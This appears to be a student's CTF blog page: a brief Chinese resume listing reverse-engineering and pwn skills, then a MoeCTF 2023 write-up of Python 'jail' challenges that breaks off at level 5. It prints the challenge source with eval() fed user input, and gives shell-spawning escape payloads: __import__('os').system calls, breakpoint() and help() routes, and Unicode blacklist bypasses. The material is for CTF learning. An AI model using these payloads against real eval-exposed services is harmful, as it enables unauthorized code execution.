<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>花开再美，怎如初见..?</title>

  <!-- keywords -->
  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="花开再美，怎如初见..?">
<meta property="og:url" content="https://wuming.github.io/index.html">
<meta property="og:site_name" content="花开再美，怎如初见..?">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="wuming">
<meta name="twitter:card" content="summary">
  
    <link rel="alternative" href="/atom.xml" title="花开再美，怎如初见..?" type="application/atom+xml">
  
  
    <link rel="icon" href="/img/favicon.ico">
  
  
<link rel="stylesheet" href="/css/style.css">

  
  

  
<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>

  
<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>


  
<meta name="generator" content="Hexo 6.3.0"></head>
<body>
  <div id="container">
    <div id="particles-js"></div>
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
				<img lazy-src="https://cdn.jsdelivr.net/gh/shenshuoyaoyouguangha/blogimg@master/202308172157431.png" class="js-avatar">
			
		</a>

		<hgroup>
			<h1 class="header-author"><a href="/">wuming</a></h1>
		</hgroup>

		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/">Home</a></li>
				        
							<li><a href="/archives">Archives</a></li>
				        
						</ul>
					</nav>
					<nav class="half-header-menu">
						<a class="hide">Home</a>
						<a>Tags</a>
						<a>Links</a>
						<a>About</a>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
								<a class="github" target="_blank" href="https://github.com/shenshuoyaoyouguangha" title="github">github</a>
					        
								<a class="mail" target="_blank" href="mailto:2993669760@qq.com" title="mail">mail</a>
					        
								<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
					        
						</div>
						<!-- music -->
						
							<!-- <div style="position: absolute; bottom: 120px; left: auto; width: 85%;"> -->
							<div style="position: absolute; left: auto; width: 85%;">
								<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=220 height=86 src="//music.163.com/outchain/player?type=2&id=1397345903&auto=1&height=66"></iframe>
							</div>
						
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						<a href="/tags/Pwn/" style="font-size: 10px;">Pwn</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/WEB/" style="font-size: 10px;">WEB</a> <a href="/tags/Web/" style="font-size: 10px;">Web</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/litctf/" style="font-size: 10px;">litctf</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a> <a href="/tags/re/" style="font-size: 10px;">re</a> <a href="/tags/write-up/" style="font-size: 10px;">write up</a>
					</div>
				</section>
				
				
				
				<section class="switch-part switch-part3">
					<div id="js-friends">
					
			          <a target="_blank" class="main-nav-link switch-friends-link" href="/null">github</a>
			        
			        </div>
				</section>
				

				
				
				<section class="switch-part switch-part4">
				
					<div id="js-aboutme">一名正在学习的ctfer...</div>
				</section>
				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide"></h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="https://cdn.jsdelivr.net/gh/shenshuoyaoyouguangha/blogimg@master/202308172157431.png" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author"></h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">Home</a></li>
		        
					<li><a href="/archives">Archives</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
						<a class="github" target="_blank" href="https://github.com/shenshuoyaoyouguangha" title="github">github</a>
			        
						<a class="mail" target="_blank" href="mailto:2993669760@qq.com" title="mail">mail</a>
			        
						<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
			        
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap">
  
    <article id="post-简历" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2023/11/01/%E7%AE%80%E5%8E%86/" class="article-date">
  	<time datetime="2023-11-01T10:34:03.542Z" itemprop="datePublished">2023-11-01</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>主要的学习的方向是reverse</p>
<p>语言方面：<br>c，c++，python，java的基本用法，了解smali语法和汇编语言</p>
<p>工具：<br>IDA pro，jadx，jeb，adb，dbg，Exeinfo PE，dnspy，MT，NP的使用，pwntools，pwndbg，ROPgadget，one_gadget，seccomp-tools，LibcSearcher，patchelf，glibc-all-in-one</p>
<p>知识：<br>IDA远程以及本地动调，了解z3库的使用,了解.net逆向，C++逆向，安卓逆向，pyc-exe，脱壳中的upx壳，魔改upx壳，手脱中的单步脱壳以及esp脱壳定律，了解一些基本的花指令并且知道如何去掉，maze的做法，SMC的原理以及动调绕过，rc4加密，了解angr，了解tea，xtea，xxtea加密，小米刷机root，简易的frida hook，jeb动调，NP和MT配合其他模块修改APP数据</p>
<p>pwndbg动调程序，ELF文件的保护机制，栈的基本知识，Ret2txt，ret2shellcode，ret2syscall，ret2libc，ret2csu等return to 系列的攻击手法以及原理，Canary三种绕过方式，简易的PIE保护绕过，了解格式化字符串，栈迁移，花样栈溢出，堆溢出的入门基础知识</p>
<p>最近一直再打，shctf，moectf，newstart，0xgame，极客大挑战，等比赛积累经验，代表学校参加科来杯，学校排名22，山东省省赛三等奖，入门大概半年，刚升入大二，开始的时候没有全身心地投入到里面，现在想加入战队学习更多的知识，结交一下各位师傅</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-moectf" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2023/10/10/moectf/" class="article-date">
  	<time datetime="2023-10-10T01:16:18.000Z" itemprop="datePublished">2023-10-10</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2023/10/10/moectf/">
        moectf
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Jail"><a href="#Jail" class="headerlink" title="Jail"></a>Jail</h1><p>[<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/578966149">PyJail] python沙箱逃逸探究·总览（HNCTF题解） - 知乎 (zhihu.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes">Bypass Python sandboxes - HackTricks — 绕过 Python 沙箱 - HackTricks</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12647#toc-23">CTF Pyjail 沙箱逃逸绕过合集 - 先知社区 (aliyun.com)</a></p>
<h2 id="jail-level-0"><a href="#jail-level-0" class="headerlink" title="jail level 0"></a>jail level 0</h2><p>第一次接触python沙盒，先了解一些基础的知识</p>
<blockquote>
<p> Hey Guys,I think maybe this is your first encounter with the Jail challenge.<br> Here is a brief description of the Jail challenge                                                                                                  </p>
<blockquote>
<p>  Your commands and code will run in a restricted environment you need to find a way to bypass the restricted environment to get the flags       </p>
</blockquote>
<p> Well, as you can see this challenge is a pyjail challenge and uses a menu where you can select functions based on relevant options.<br> For example, type g to get the source code of the challenge, e to enter the challenge, c to get the description of the challenge, q to exit<br> The following description is unique to the Challenge Description function of the terminal                                                          </p>
<p> I’m glad you understood the purpose of the menu and managed to get here, and I’m sure you’ve read the source code, but if you’re not familiar<br> with python, I’d recommend checking out <a target="_blank" rel="noopener" href="https://docs.python.org/3/">https://docs.python.org/3/</a> and <a target="_blank" rel="noopener" href="https://www.runoob.com/python3/python3-tutorial.html">https://www.runoob.com/python3/python3-tutorial.html</a> first.<br> The function of the code is probably that you can type in some arithmetic expression, like 1+1 and he’ll give you 2 back.But your goal is to get<br> flag use it. </p>
</blockquote>
<p>这里推荐的网站是，很好用</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes">Bypass Python sandboxes - HackTricks — 绕过 Python 沙箱 - HackTricks</a></p>
</blockquote>
<p>做题目的过程就是首先先G，获取题目源代码，然后进行E进入挑战，成功绕过各种限制后就可以得到flag</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| Options: </span><br><span class="line">|	[G]et Challenge Source Code </span><br><span class="line">|	[E]nter into Challenge </span><br><span class="line">|	[C]hallenge Description </span><br><span class="line">|	[Q]uit </span><br></pre></td></tr></table></figure>

<p>我们按G可以看到源码就是这样，没有任何限制</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the MoeCTF2023 Jail challenge.It&#x27;s time to work on this calc challenge.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">user_input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;calc Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(user_input_data)))</span><br></pre></td></tr></table></figure>

<p>但同样的，他没有执行我们命令的库，引用网站的第一句</p>
<p>Command Execution Libraries</p>
<blockquote>
<p>The first thing you need to know is if you can directly execute code with some already imported library, or if you could import any of these libraries:</p>
</blockquote>
<p>我们直接看源码是没有发现我们需要执行函数所需要的库的，那我们直接导入然后执行</p>
<blockquote>
<p><strong>import</strong>(“os”).system(“cat flag”)<br>flag{U45lmeD5YgYUy3VtI5Y0l1rJ-qYp9DCg}</p>
</blockquote>
<h2 id="jail-level-1"><a href="#jail-level-1" class="headerlink" title="jail level 1"></a>jail level 1</h2><p>我们直接查看源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the MoeCTF2023 Jail challenge level1.It&#x27;s time to work on this calc challenge.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">user_input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(user_input_data)&gt;<span class="number">12</span>:</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Oh hacker! Bye~&quot;</span>)</span><br><span class="line">  exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;calc Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(user_input_data)))</span><br></pre></td></tr></table></figure>

<p>可以看到，他的限制就多了一条字节数不能大于12而已，那么我们可以使用</p>
<p>breakpoint()就会进到Pdb里面。</p>
<blockquote>
<p>pdb 模块定义了一个交互式源代码调试器，用于 Python 程序。它支持在源码行间设置（有条件的）断点和单步执行，检视堆栈帧，列出源码列表，以及在任何堆栈帧的上下文中运行任意 Python 代码。它还支持事后调试，可以在程序控制下调用。</p>
</blockquote>
<p>只要我们进入了pdb模式，就可以进行一句话RCE了</p>
<p>（还有一种方法是使用help() -&gt; os -&gt; !sh，但这个题目不行，不知道为什么）</p>
<blockquote>
<p>breakpoint()</p>
<p><strong>import</strong>(“os”).system(“sh”)</p>
</blockquote>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.1t1vuf648xwg.webp"></p>
<h2 id="jail-level-2"><a href="#jail-level-2" class="headerlink" title="jail level 2"></a>jail level 2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the MoeCTF2023 Jail challenge level1.It&#x27;s time to work on this calc challenge.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">user_input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(user_input_data)&gt;<span class="number">6</span>:</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Oh hacker! Bye~&quot;</span>)</span><br><span class="line">  exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;calc Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(user_input_data)))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们可以看到正好就用到了我们上一个挑战没用到的help（）方法</p>
<blockquote>
<p>help() -&gt; os -&gt; !sh</p>
</blockquote>
<blockquote>
<p>help()<br>help&gt; modules<br>help&gt; antigravity<br>@ → &#x2F;bin&#x2F;sh<br>&#x2F;bin&#x2F;sh 1&gt;&amp;2<br>reset<br>cat .passwd</p>
</blockquote>
<p>使用help（）进入help的终端界面，就可以看到很多模块，我们选择os模块，然后在终端输入!sh就可以进入shell了，之后直接cat flag即可，我们顺便也可以看一下他的源代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  __  __  ___        _____        _        _                _                         _                _ ___  </span></span><br><span class="line"><span class="string"> |  \/  |/ _ \      / ____| ____ | |      | |              (_)                       | |              | |__ \ </span></span><br><span class="line"><span class="string"> | \  / | | | | ___| |     / __ \| | ___  | |__   ___  __ _ _ _ __  _ __   ___ _ __  | | _____   _____| |  ) |</span></span><br><span class="line"><span class="string"> | |\/| | | | |/ _ \ |    / / _` | |/ __| | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__| | |/ _ \ \ / / _ \ | / / </span></span><br><span class="line"><span class="string"> | |  | | |_| |  __/ |___| | (_| | | (__  | |_) |  __/ (_| | | | | | | | |  __/ |    | |  __/\ V /  __/ |/ /_ </span></span><br><span class="line"><span class="string"> |_|  |_|\___/ \___|\_____\ \__,_|_|\___| |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|    |_|\___| \_/ \___|_|____|</span></span><br><span class="line"><span class="string">                           \____/                      __/ |                                                  </span></span><br><span class="line"><span class="string">                                                      |___/                                                                                                                         </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">CHALLENGE_SOURCE_CODE = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">print(&quot;Welcome to the MoeCTF2023 Jail challenge level1.It&#x27;s time to work on this calc challenge.&quot;)</span></span><br><span class="line"><span class="string">print(&quot;Enter your expression and I will evaluate it for you.&quot;)</span></span><br><span class="line"><span class="string">user_input_data = input(&quot;&gt; &quot;)</span></span><br><span class="line"><span class="string">if len(user_input_data)&gt;6:</span></span><br><span class="line"><span class="string">  print(&quot;Oh hacker! Bye~&quot;)</span></span><br><span class="line"><span class="string">  exit(0)</span></span><br><span class="line"><span class="string">print(&#x27;calc Answer: &#123;&#125;&#x27;.format(eval(user_input_data)))</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">CHALLENGE_DESCRIPT = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||</span></span><br><span class="line"><span class="string">|                                                                                                                                                    |</span></span><br><span class="line"><span class="string">| Hey Guys,I think maybe this is your first encounter with the Jail challenge.                                                                       |</span></span><br><span class="line"><span class="string">| Here is a brief description of the Jail challenge                                                                                                  |</span></span><br><span class="line"><span class="string">| &gt;   Your commands and code will run in a restricted environment you need to find a way to bypass the restricted environment to get the flags       |</span></span><br><span class="line"><span class="string">|                                                                                                                                                    |</span></span><br><span class="line"><span class="string">| Well, as you can see this challenge is a pyjail challenge and uses a menu where you can select functions based on relevant options.                |</span></span><br><span class="line"><span class="string">| For example, type g to get the source code of the challenge, e to enter the challenge, c to get the description of the challenge, q to exit        | </span></span><br><span class="line"><span class="string">| The following description is unique to the Challenge Description function of the terminal                                                          |</span></span><br><span class="line"><span class="string">|                                                                                                                                                    |</span></span><br><span class="line"><span class="string">| I&#x27;m glad you understood the purpose of the menu and managed to get here, and I&#x27;m sure you&#x27;ve read the source code, but if you&#x27;re not familiar      |    </span></span><br><span class="line"><span class="string">| with python, I&#x27;d recommend checking out https://docs.python.org/3/ and https://www.runoob.com/python3/python3-tutorial.html first.                 |</span></span><br><span class="line"><span class="string">| The function of the code is probably that you can type in some arithmetic expression, like 1+1 and he&#x27;ll give you 2 back.But your goal is to get   |</span></span><br><span class="line"><span class="string">| flag use it.                                                                                                                                       |</span></span><br><span class="line"><span class="string">|                                                                                                                                                    |</span></span><br><span class="line"><span class="string">||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">CHALLENGE_HINT_FOR_BEGINNER = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||</span></span><br><span class="line"><span class="string">|                                                                                                                                                    |</span></span><br><span class="line"><span class="string">| Hint for beginner:                                                                                                                                 |</span></span><br><span class="line"><span class="string">| 1. you need to find a payload not above 6 byte                                                                                                     |</span></span><br><span class="line"><span class="string">| 2. the docker file use socat. the EXEC arg is --&gt; `EXEC:&quot;./xxxxxxx.py&quot;,pty,......`                                                                 |</span></span><br><span class="line"><span class="string">|                                                                                                                                                    |</span></span><br><span class="line"><span class="string">||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;| Options: \n|\t[G]et Challenge Source Code \n|\t[E]nter into Challenge \n|\t[C]hallenge Description \n|\t[Q]uit \n\t&quot;</span>)</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">  choice = <span class="built_in">input</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>).lower().strip()</span><br><span class="line">  <span class="keyword">if</span> choice == <span class="string">&#x27;g&#x27;</span>:</span><br><span class="line">      <span class="built_in">print</span>(CHALLENGE_SOURCE_CODE)</span><br><span class="line">  <span class="keyword">elif</span> choice == <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Welcome to the MoeCTF2023 Jail challenge.It&#x27;s time to work on this calc challenge.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">    user_input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(user_input_data)&gt;<span class="number">6</span>:</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&quot;Oh hacker! Bye~&quot;</span>)</span><br><span class="line">      exit(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Answer result: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(user_input_data)))</span><br><span class="line">  <span class="keyword">elif</span> choice == <span class="string">&quot;c&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(CHALLENGE_DESCRIPT)</span><br><span class="line">    user_input_hint_choice = <span class="built_in">input</span>(<span class="string">&quot;If you still don&#x27;t know how to solve it,do you need some hint? (y/n) &gt; &quot;</span>).lower().strip()</span><br><span class="line">    <span class="keyword">if</span> user_input_hint_choice == <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">      <span class="built_in">print</span>(CHALLENGE_HINT_FOR_BEGINNER)</span><br><span class="line">    <span class="keyword">if</span> user_input_hint_choice == <span class="string">&#x27;n&#x27;</span>:</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&quot;Good luck!&quot;</span>)</span><br><span class="line">  <span class="keyword">elif</span> choice == <span class="string">&#x27;q&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bye~~~&quot;</span>)</span><br><span class="line">    quit()</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;You should select valid choice!&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="jail-level-3"><a href="#jail-level-3" class="headerlink" title="jail level 3"></a>jail level 3</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">BANLIST = [<span class="string">&#x27;breakpoint&#x27;</span>]</span><br><span class="line">BANLIST_WORDS = <span class="string">&#x27;|&#x27;</span>.join(<span class="string">f&#x27;(<span class="subst">&#123;WORD&#125;</span>)&#x27;</span> <span class="keyword">for</span> WORD <span class="keyword">in</span> BANLIST)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the MoeCTF2023 Jail challenge.It&#x27;s time to work on this calc challenge.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">user_input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(user_input_data)&gt;<span class="number">12</span>:</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Oh hacker! Bye~&quot;</span>)</span><br><span class="line">  exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> re.findall(BANLIST_WORDS, user_input_data, re.I):</span><br><span class="line">  <span class="keyword">raise</span> Exception(<span class="string">&#x27;Blacklisted word detected! you are hacker!&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Answer result: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(user_input_data)))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12647#toc-23">CTF Pyjail 沙箱逃逸绕过合集 - 先知社区 (aliyun.com)</a></p>
<p>相比较jail1多了一个breakpoint()的过滤，通过网上搜索，我们对于函数名可以使用<strong>Unicode</strong>进行绕过，数字可以使用<em><strong>ord</strong></em>绕过，当然如果他的限制大小是&gt;13的话可以使用</p>
<blockquote>
<p>eval(input())</p>
</blockquote>
<p>那么我们就可以对其中一个字符进行Unicode编码，然后传送到目标处</p>
<blockquote>
<p>输入法的全角输入就是unicode编码</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">breakpｏ<span class="built_in">int</span>()</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;sh&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.1igtu8neq2m8.webp"></p>
<h2 id="jail-level-4"><a href="#jail-level-4" class="headerlink" title="jail level 4"></a>jail level 4</h2><p>python2的沙盒逃逸</p>
<p>python2：input（） &#x3D; python3：eavl（input（））</p>
<p>直接一句话就行</p>
<blockquote>
<p><strong>import</strong>(“os”).system(“sh”)</p>
</blockquote>
<h2 id="jail-level-5"><a href="#jail-level-5" class="headerlink" title="jail level 5"></a>jail level 5</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the MoeCTF2023 Jail challenge.It&#x27;s time to work on this calc challenge.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_filter</span>(<span class="params">s</span>):</span><br><span class="line">  not_allowed = <span class="built_in">set</span>(<span class="string">&#x27;&quot;&#x27;</span>`bid<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">  return any(c in not_allowed for c in s)</span></span><br><span class="line"><span class="string">user_input_data = input(&quot;&gt; &quot;)</span></span><br><span class="line"><span class="string">if func_filter(user_input_data):</span></span><br><span class="line"><span class="string">  print(&quot;Oh hacker! Bye~&quot;)</span></span><br><span class="line"><span class="string">  exit(0)</span></span><br><span class="line"><span class="string">if not user_input_data.isascii():</span></span><br><span class="line"><span class="string">  print(&quot;Sorry we only ascii for this chall!&quot;)</span></span><br><span class="line"><span class="string">  exit(0)</span></span><br><span class="line"><span class="string">print(&#x27;</span>Answer result: &#123;&#125;<span class="string">&#x27;.format(eval(user_input_data)))</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>





